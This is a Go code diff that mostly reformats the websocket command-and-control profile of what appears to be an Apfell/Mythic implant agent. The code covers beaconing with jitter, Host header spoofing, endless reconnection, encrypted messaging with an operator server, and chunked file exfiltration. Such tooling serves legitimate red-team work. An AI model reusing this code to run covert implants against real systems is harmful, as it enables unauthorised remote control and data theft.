@@ -5,6 +5,7 @@ package profiles
 import (
 	"bytes"
 	"crypto/rsa"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -13,9 +14,8 @@ import (
 	"os"
 	"reflect"
 	"strings"
-	"time"
 	"sync"
-	"crypto/tls"
+	"time"
 	//"log"
 
 	"github.com/gorilla/websocket"
@@ -46,18 +46,18 @@ type C2Websockets struct {
 	ApfellID       string
 	UserAgent      string
 	UUID           string
-	Key         string
+	Key            string
 	RsaPrivateKey  *rsa.PrivateKey
 	Conn           *websocket.Conn
-	Endpoint 	 string
+	Endpoint       string
 }
 
 func newProfile() Profile {
 	return &C2Websockets{}
 }
 
-func (c C2Websockets) getSleepTime() int{
-    return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter))/float64(100.0))));
+func (c C2Websockets) getSleepTime() int {
+	return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter)) / float64(100.0))))
 }
 
 func (c C2Websockets) SleepInterval() int {
@@ -68,8 +68,8 @@ func (c *C2Websockets) SetSleepInterval(interval int) {
 	c.Interval = interval
 }
 
-func (c *C2Websockets) SetSleepJitter(jitter int){
-    c.Jitter = jitter
+func (c *C2Websockets) SetSleepJitter(jitter int) {
+	c.Jitter = jitter
 }
 
 func (c C2Websockets) ApfID() string {
@@ -120,9 +120,9 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, ope
 	//log.Printf(url)
 	header := make(http.Header)
 	header.Set("User-Agent", c.UserAgent)
-	
+
 	// Set the host header
-	if (len(c.HostHeader) > 0) {
+	if len(c.HostHeader) > 0 {
 		header.Set("Host", c.HostHeader)
 	}
 
@@ -132,15 +132,15 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, ope
 		},
 	}
 	for true {
-        connection, _, err := d.Dial(url, header)
-        if err != nil {
-            //log.Printf("Error connecting to server %s ", err.Error())
-            //return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
-            time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-            continue
-        }
-        c.Conn = connection
-        break
+		connection, _, err := d.Dial(url, header)
+		if err != nil {
+			//log.Printf("Error connecting to server %s ", err.Error())
+			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
+			continue
+		}
+		c.Conn = connection
+		break
 	}
 
 	//log.Println("Connected to server ")
@@ -262,7 +262,6 @@ func (c *C2Websockets) SendFile(task structs.Task, params string, ch chan []byte
 }
 
 func (c *C2Websockets) GetFile(task structs.Task, fileDetails structs.FileUploadParams, ch chan []byte) {
-
 
 	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
 	fileUploadMsg.Action = "upload"
@@ -402,7 +401,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 	// Wait for a response from the channel
 
 	for {
-		resp := <- ch
+		resp := <-ch
 		err := json.Unmarshal(resp, &fileDetails)
 		if err != nil {
 			errResponse := structs.Response{}
@@ -429,7 +428,6 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 		}
 	}
 
-	
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
 	//time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
@@ -457,8 +455,8 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 		var postResp map[string]interface{}
 		for {
 			decResp := <-ch
-			err := json.Unmarshal(decResp, &postResp)// Wait for a response for our file chunk
-		
+			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk
+
 			if err != nil {
 				errResponse := structs.Response{}
 				errResponse.Completed = true
@@ -485,7 +483,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 
 		if !strings.Contains(postResp["status"].(string), "success") {
 			// If the post was not successful, wait and try to send it one more time
-			
+
 			mu.Lock()
 			TaskResponses = append(TaskResponses, encmsg)
 			mu.Unlock()
@@ -553,10 +551,10 @@ func (c *C2Websockets) NegotiateKey() string {
 	return sessionID
 
 }
-func (c *C2Websockets) reconnect(){
-    header := make(http.Header)
+func (c *C2Websockets) reconnect() {
+	header := make(http.Header)
 	header.Set("User-Agent", c.UserAgent)
-	if (len(c.HostHeader) > 0) {
+	if len(c.HostHeader) > 0 {
 		header.Set("Host", c.HostHeader)
 	}
 	d := websocket.Dialer{
@@ -565,47 +563,47 @@ func (c *C2Websockets) reconnect(){
 		},
 	}
 	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
-    for true {
-        connection, _, err := d.Dial(url, header)
-        if err != nil {
-            //log.Printf("Error connecting to server %s ", err.Error())
-            //return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
-            time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-            continue
-        }
-        c.Conn = connection
-        break
+	for true {
+		connection, _, err := d.Dial(url, header)
+		if err != nil {
+			//log.Printf("Error connecting to server %s ", err.Error())
+			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
+			continue
+		}
+		c.Conn = connection
+		break
 	}
 }
 func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 	m := structs.Message{}
-    if len(c.Key) != 0 {
-        sendData = c.encryptMessage(sendData)
-    }
+	if len(c.Key) != 0 {
+		sendData = c.encryptMessage(sendData)
+	}
 
-    sendData = append([]byte(c.ApfellID), sendData...)
-    sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
-	for true{
+	sendData = append([]byte(c.ApfellID), sendData...)
+	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
+	for true {
 		m.Client = true
 		m.Data = string(sendData)
 		m.Tag = tag
 		//log.Printf("Sending message %+v\n", m)
 		err := c.Conn.WriteJSON(m)
 		if err != nil {
-		    //log.Printf("%v", err);
-		    c.reconnect()
+			//log.Printf("%v", err);
+			c.reconnect()
 			continue
 		}
 		// Read the response
 		resp := structs.Message{}
 		err = c.Conn.ReadJSON(&resp)
-	
+
 		if err != nil {
 			//log.Println("Error trying to read message ", err.Error())
 			c.reconnect()
 			continue
 		}
-	
+
 		raw, err := base64.StdEncoding.DecodeString(resp.Data)
 		if err != nil {
 			//log.Println("Error decoding base64 data: ", err.Error())
@@ -613,28 +611,27 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 		}
 
 		if len(raw) < 36 {
-		    //log.Println("length of data < 36")
-			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-            continue
+			//log.Println("length of data < 36")
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
+			continue
 		}
-	
+
 		enc_raw := raw[36:] // Remove the Payload UUID
-	
+
 		if len(c.Key) != 0 {
 			//log.Printf("Decrypting data")
 			enc_raw = c.decryptMessage(enc_raw)
 			if len(enc_raw) == 0 {
-				time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-                continue
+				time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
+				continue
 			}
 		}
-	
+
 		return enc_raw
 	}
-	
+
 	return make([]byte, 0)
 }
-
 
 func (c *C2Websockets) encryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
